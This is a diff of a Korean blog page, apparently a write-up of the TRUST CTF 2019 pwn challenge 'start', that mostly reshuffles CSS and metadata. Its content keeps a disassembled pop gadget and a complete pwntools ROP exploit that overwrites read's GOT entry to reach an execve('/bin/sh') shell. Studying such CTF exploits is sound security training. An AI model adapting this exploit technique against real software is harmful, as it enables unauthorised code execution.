@@ -12,18 +12,18 @@
     
         <meta name="keywords" content="WriteUps,TRUST">
     
-    <meta name="description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   start Binary File{: .btn .btn_info} 123456789sub_4005E6 proc n">
+    <meta name="description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.    12345">
 <meta name="keywords" content="WriteUps,TRUST">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TRUST CTF 2019 start">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/02/15/pwnstart/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   start Binary File{: .btn .btn_info} 123456789sub_4005E6 proc n">
+<meta property="og:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.    12345">
 <meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-05-20T15:16:20.449Z">
+<meta property="og:updated_time" content="2019-05-22T06:02:58.005Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TRUST CTF 2019 start">
-<meta name="twitter:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   start Binary File{: .btn .btn_info} 123456789sub_4005E6 proc n">
+<meta name="twitter:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.    12345">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/02/15/pwnstart/">
 
@@ -176,14 +176,8 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <style>
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
-</style>
-<h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2>
-<p><a href="/j0n9hyun.github.io/upload/start.zip">Binary File</a>{: .btn .btn_info}</p>
+            <h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2>
+<p><a href="/j0n9hyun.github.io/upload/start.zip">Binary File</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_4005E6 proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">pop     rax</span><br><span class="line">pop     rdx</span><br><span class="line">pop     rdi</span><br><span class="line">pop     rsi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
 <center><small>[sub_4005E6]</small></center>
 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  
@@ -197,6 +191,12 @@
 <br>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote('server.trustctf.com', 10392)</span></span><br><span class="line">r = process(<span class="string">'./start'</span>)</span><br><span class="line">e = ELF(<span class="string">'./start'</span>)</span><br><span class="line">pr = <span class="number">0x4005ed</span> <span class="comment"># pop rsi</span></span><br><span class="line">ppppr = <span class="number">0x4005ea</span> <span class="comment"># pop rax,rdx,rdi,rsi</span></span><br><span class="line">cmd = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">syscall = <span class="string">"\x7b"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.got[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.send(syscall)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center>
+<style>
+  img.border-shadow{
+      border:1px solid #888888;
+      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+  }
+</style>
 
         </div>
         <footer class="article-footer">
@@ -280,18 +280,16 @@
         "genre": "WriteUps Pwn",
         "datePublished": "2019-02-15",
         "dateCreated": "2019-02-15",
-        "dateModified": "2019-05-21",
+        "dateModified": "2019-05-22",
         "url": "http://j0n9hyun.github.io/2019/02/15/pwnstart/",
-        "description": "
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
+        "description": " start
+Binary File
+123456789sub_4005E6 proc near; __unwind &#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn
+[sub_4005E6]
+4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  
 
- start
-Binary File{: .btn .btn_info}
-123456789sub_4005E6 proc n"
-        "wordCount": 388
+12345"
+        "wordCount": 392
     }
 </script>
 
